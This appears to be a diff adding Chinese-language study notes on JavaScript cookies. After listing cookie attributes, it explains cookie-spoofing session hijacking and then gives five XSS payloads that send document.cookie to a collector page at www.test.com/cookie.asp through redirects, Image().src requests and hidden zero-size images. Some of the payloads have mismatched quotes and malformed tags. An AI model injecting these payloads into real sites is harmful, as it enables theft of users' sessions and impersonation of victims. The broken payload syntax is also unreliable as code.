@@ -1,0 +1,37 @@
+JavaScript操作cookie：
+	1.cookie的创建十分简单：将特定格式的字符串（cookieName=cookieValue;expirationdate;path）赋值给document.cookie即可
+	2.cookie的属性：
+		Domian:关联cookie的域名
+		Expires：持久化cookie的过期时间
+		HttpOnly：避免cookie被JavaScript访问
+		Name：cookie的名称
+		Path：关联到cookie的路径，默认为/
+		Value：读写cookie的值
+		Secure：指定cookie需要用安全套接字连接
+		
+对cookie的利用，cookie中包含了一些客户端的信息，但是攻击者的目标一般不是窃取这些加密过的信息，而是直接
+将加密的字符串向服务器提交，即可伪装成受害者的身份（cookie欺骗或者cookie会话攻击）。
+
+获得cookie：
+<script>
+document.location="http://www.test.com/cookie.asp?cookie ='+document.cookie
+</script>
+
+< img src="http://www.test.com/cookie.asp?cookie='+document.cookie">
+</img>
+
+<script>
+new Image().src="http://www.test.com/cookie.asp?cookie="+document.cookie;
+</script>
+
+<script>
+img = new Image();
+img.src = "http://www.test.com/cookie.asp?cookie="+document.cookie;
+img.width = 0;
+img.height = 0
+</script>
+
+<script>
+document.write('< img src="http://www.test.com/cookie.asp?cookie='+document.cookie+'"
+width=0 height=0 border=0 />');
+</script>
